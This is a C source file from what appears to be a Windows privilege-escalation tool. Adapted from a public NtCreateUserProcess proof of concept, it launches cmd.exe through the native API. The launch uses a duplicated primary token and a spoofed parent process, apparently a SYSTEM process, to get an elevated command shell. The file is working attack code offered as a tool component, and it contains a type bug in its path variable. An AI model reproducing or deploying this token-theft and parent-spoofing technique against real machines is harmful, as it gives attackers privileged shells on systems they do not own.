#include <Windows.h>
#include "starfly.h"
#include "nt.h"
#include <wchar.h>
HANDLE hProcess;
HANDLE hThread;
/*========================================
 以下代码改编于Capt-Meelo对底层函数研究的PoC
 https://github.com/capt-meelo/NtCreateUserProcess
========================================*/
void SFOpenCMD() {
    char exePath = "C:\\Windows\\System32\\cmd.exe";
    hProcess = NULL;
    hThread = NULL;
    size_t len = strlen(exePath) + 1;
    WCHAR* wexePath = (WCHAR*)malloc(len * sizeof(WCHAR));
    MultiByteToWideChar(CP_UTF8, 0, exePath, -1, wexePath, len);
    WCHAR fullPath[MAX_PATH];
    swprintf_s(fullPath, MAX_PATH, L"\\??\\%ls", wexePath);
	UNICODE_STRING NtImagePath;
	RtlInitUnicodeString(&NtImagePath, fullPath);
	PRTL_USER_PROCESS_PARAMETERS ProcessParameters = NULL;
	RtlCreateProcessParametersEx(&ProcessParameters, &NtImagePath, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, RTL_USER_PROCESS_PARAMETERS_NORMALIZED);
	PS_CREATE_INFO CreateInfo = { 0 };
	CreateInfo.Size = sizeof(CreateInfo);
	CreateInfo.State = PsCreateInitialState;
    if (hDupPriToken != 0xcccccccccccccccc && hDupPriToken != 0) {
        PPS_ATTRIBUTE_LIST AttributeList = (PS_ATTRIBUTE_LIST*)RtlAllocateHeap(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_ATTRIBUTE)*3);
	    AttributeList->TotalLength = sizeof(PS_ATTRIBUTE_LIST) - sizeof(PS_ATTRIBUTE);
	    AttributeList->Attributes[0].Attribute = PS_ATTRIBUTE_IMAGE_NAME;
	    AttributeList->Attributes[0].Size = NtImagePath.Length;
	    AttributeList->Attributes[0].Value = (ULONG_PTR)NtImagePath.Buffer;
	    AttributeList->Attributes[1].Attribute = PS_ATTRIBUTE_PARENT_PROCESS;
	    AttributeList->Attributes[1].Size = sizeof(HANDLE);
	    AttributeList->Attributes[1].ValuePtr = hSysProcess;
	    AttributeList->Attributes[2].Attribute = PS_ATTRIBUTE_TOKEN;
        AttributeList->Attributes[2].Size = sizeof(HANDLE);
        AttributeList->Attributes[2].Value = (ULONG_PTR)&hDupPriToken;
        o_mode = 3;
        SFPrintStatus("Creating Process.","正在创建进程");
	    SFNtCreateUserProcess(&hProcess, &hThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL, NULL, NULL, ProcessParameters, &CreateInfo, AttributeList);
    } else {
        SFPrintError("Please Obtain a Valid Primary Token First.", "请先获取主令牌");
    }
    return;
}

void OpenCMDErrorHandler() {
    o_mode = 0;
    if (hProcess != 0 || hThread != 0) {
        SFPrintSuccess("Successfully Created Process.", "创建进程成功");
    } else {
        SFPrintError("Failed to Create Process.", "创建进程失败");
    }
    o_restart = 1;
    main();
}